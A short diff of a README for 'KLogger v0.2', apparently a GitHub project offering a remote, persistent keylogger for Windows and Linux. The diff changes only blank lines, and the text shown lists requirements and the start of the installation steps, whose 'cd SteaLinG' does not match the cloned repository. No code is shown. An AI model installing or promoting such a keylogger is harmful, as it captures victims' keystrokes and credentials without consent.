@@ -4,7 +4,6 @@
   K🔑Logger v0.2
   <br>  
 </h1>
-
 <p align="center">
   <img src="https://img.shields.io/badge/Author-mido--de3vil-orange">
   <img src="https://img.shields.io/badge/Open%20Source-Yes-cyan?style=flat-square">
@@ -21,7 +20,9 @@ Remote persistent 🔑Logger for Windows and Linux
 * python >= 3.8 ++ Download [Python](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe)
 * os : Windows
 * os : Linux
+
 ### Installation to Windows:
+
 ```bash
 git clone https://github.com/De3vil/KLogger.git
 cd SteaLinG
